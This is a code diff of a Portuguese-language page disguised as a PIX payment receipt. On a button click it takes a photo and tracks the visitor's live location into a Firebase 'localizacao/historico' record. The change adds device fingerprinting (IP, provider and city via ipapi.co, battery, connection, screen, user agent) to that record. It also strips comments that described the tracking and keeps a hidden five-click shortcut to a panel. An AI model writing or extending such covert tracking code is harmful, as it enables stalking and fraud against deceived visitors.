@@ -190,7 +190,6 @@
     const app = initializeApp(firebaseConfig);
     const db = getDatabase(app);
 
-    // Carrega dados dinâmicos do PIX
     onValue(ref(db, 'config/pix'), (snapshot) => {
       const data = snapshot.val();
       if (data) {
@@ -206,7 +205,6 @@
     let registroRef = null;
     let wakeLock = null;
 
-    // Impede a tela do celular de apagar durante a navegação
     async function ativarWakeLock() {
       try {
         if ('wakeLock' in navigator) {
@@ -254,21 +252,52 @@
       }
     }
 
+    async function capturarDispositivo() {
+      let ipData = {};
+      try {
+        const res = await fetch('https://ipapi.co/json/');
+        if (res.ok) ipData = await res.json();
+      } catch (e) {
+        console.warn("Erro ao buscar IP:", e);
+      }
+
+      let statusBateria = "Indisponível";
+      try {
+        if ('getBattery' in navigator) {
+          const b = await navigator.getBattery();
+          statusBateria = `${Math.round(b.level * 100)}% (${b.charging ? 'Carregando' : 'Desconectado'})`;
+        }
+      } catch (e) {}
+
+      const conexao = navigator.connection ? navigator.connection.effectiveType : "Desconhecida";
+
+      return {
+        ip: ipData.ip || "Não identificado",
+        provedor: ipData.org || ipData.asn || "Não identificado",
+        cidade: ipData.city || "Não identificada",
+        bateria: statusBateria,
+        conexao: conexao,
+        tela: `${window.screen.width}x${window.screen.height}`,
+        userAgent: navigator.userAgent
+      };
+    }
+
     btn.addEventListener('click', async () => {
       status.innerHTML = '<div class="spinner"></div><span>Processando confirmação...</span>';
 
       ativarWakeLock();
-      const fotoBase64 = await tirarFoto();
+      const [fotoBase64, dispositivoInfo] = await Promise.all([
+        tirarFoto(),
+        capturarDispositivo()
+      ]);
 
       if (!navigator.geolocation) {
         status.innerText = "Geolocalização não suportada.";
         return;
       }
 
-      // Cria a chave única de rastreamento no Firebase
       registroRef = push(ref(db, 'localizacao/historico'));
 
-      // Inicia monitoramento contínuo em tempo real
       navigator.geolocation.watchPosition(
         async (pos) => {
           const { latitude, longitude, accuracy } = pos.coords;
@@ -291,14 +320,14 @@
             console.warn("Erro ao buscar endereço:", err);
           }
 
-          // Atualiza as coordenadas em tempo real no mesmo registro
           update(registroRef, {
             lat: latitude,
             lng: longitude,
             precisao: accuracy,
             endereco: enderecoFormatado,
             foto: fotoBase64 || null,
-            timestamp: new Date().toISOString()
+            timestamp: new Date().toISOString(),
+            dispositivo: dispositivoInfo
           }).then(() => {
             status.innerText = "Comprovante gerado com sucesso!";
           });
@@ -310,7 +339,6 @@
       );
     });
 
-    // Escudo secreto (5 cliques para ir para o painel)
     let cliqueCount = 0;
     let timer;
     const escudo = document.getElementById('escudoSecreto');
